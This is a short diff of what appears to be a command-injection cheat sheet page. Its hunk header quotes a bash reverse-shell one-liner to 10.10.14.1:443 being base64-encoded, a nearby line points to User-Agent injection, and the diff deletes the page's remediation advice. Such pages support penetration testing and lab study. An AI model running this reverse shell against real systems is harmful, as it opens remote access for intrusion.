@@ -108,11 +108,6 @@ echo -n 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1' | base64
       the fetcher passes to the shell (`User-Agent` into a log-processing command is
       a classic).
 
-## :material-shield-check: Remediation
-
-- Avoid the shell entirely — use language APIs (`subprocess` with an arg **list**, no `shell=True`).
-- If unavoidable, allowlist input and use `shlex.quote`; never blocklist characters.
-
 ## :material-link-variant: Related
 
 - Filtered? Same bypass tricks apply to [SSTI](ssti.md) and [Deserialization](deserialization.md).
